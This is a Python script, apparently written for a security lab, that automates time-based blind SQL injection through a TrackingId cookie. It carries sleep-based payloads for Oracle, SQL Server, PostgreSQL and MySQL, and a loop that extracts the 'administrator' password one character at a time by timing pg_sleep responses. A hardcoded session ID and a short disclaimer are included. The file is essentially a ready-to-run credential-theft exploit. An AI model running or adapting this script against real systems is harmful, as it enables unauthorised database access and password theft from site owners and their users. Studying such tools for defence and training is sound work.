'''
 Copyright (C) <2022> Yan Zaripov, https://github.com/jonnyzar/

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

    SECURITY DISCLAIMER:
    This program is intended for educational or self-assessment purposes only.
    You may have legal consequences if you use it to attack systems that do not 
    belong to you.
'''


from pickle import FALSE, TRUE
from turtle import position
import requests
import sys
import argparse
import urllib.parse as up
import string


def getArguments():
    if len(sys.argv) > 1:
        URL = sys.argv[1]
    else:
        print("Usage: python3 time_based_SQLi.py URL [...]") 

    return URL


def getTiming(sTime,eTime,inTrigger):
    '''
    Determine time delay from response to request and compare to trigger
    
    True if delay is equal or larger than trigger
    '''

    delta = eTime - sTime

    if inTrigger >= delta:
        return True
    else:
        return False

def sendRequest(URL, inCookies):
    '''
    Sends reuquest to target URL with specified payload

    Payload is gonna be some conditional SQL statement 
    '''

    #GET

    res = requests.get(URL,cookies = inCookies)

    status = res.status_code
    #counts time between request an response
    elapsed = res.elapsed.total_seconds()

    return elapsed 
    
def findEntry(inTrigger, URL, sessID):
    payloads={
        "ORACLE":"'; SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),2) ELSE NULL END FROM dual--",
        "Microsoft":"'; IF (1=1) WAITFOR DELAY '0:0:2'--",
        "PostgreSQL":"'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--",
        "MySQL":"'; SELECT IF (1=1),SLEEP(2),'a')--"
    }

    for key in payloads:
        cookies = dict(TrackingId = up.quote(payloads[key]), session = sessID)
        timeElpased = sendRequest(URL, cookies)

        if timeElpased >= inTrigger:
            print("[+] Time based SQLi possible")
            print("Payload for SQLi: ", payloads[key])

        
def fuzzPass(inTrigger, URL, sessID):

    symbols=list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    password = []
  
    for letter_pos in range(1,25,1):
        for i in range(len(symbols)):
            payload = "'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,"
            payload += str(letter_pos) 
            payload += ",1)='" + symbols[i] + "') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--"

           #print("sending...")
            #print(payload)

            cookies = dict(TrackingId = up.quote(payload), session = sessID)
            timeElpased = sendRequest(URL, cookies)

            if timeElpased >= inTrigger:
                print("[+] Password letter found")
                print("Position: " + str(letter_pos) + " and Value= " + symbols[i])
                password.append(symbols[i])
                print("".join(password))
                break

            if i == (len(symbols) - 1):
                print("No more matching characters. Exiting")
                return password



#################################### Main ##############################

def main():

    parser = argparse.ArgumentParser()
    
    parser.add_argument('URL', type=str, help='target URL')


    #parse inputs
    args = parser.parse_args()

    targetURL = args.URL

    #from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based
    #payload="x'; SELECT 1 FROM PG_SLEEP(2) --"

    #payload="'; SELECT CASE WHEN 1=1 THEN pg_sleep(2) ELSE pg_sleep(0) END --"



    #trID=up.quote(payload)
    sessID=up.quote("Ct7jARyZq3bkSwHb6z5z3khEyu6w6HB9")


    # trigger in seconds
    inTrigger = 3

    #findEntry(inTrigger, targetURL, sessID)

    password = fuzzPass(inTrigger, targetURL, sessID)

    print("And the Admin Password is " + ''.join(password))

if __name__ == "__main__":
    main()
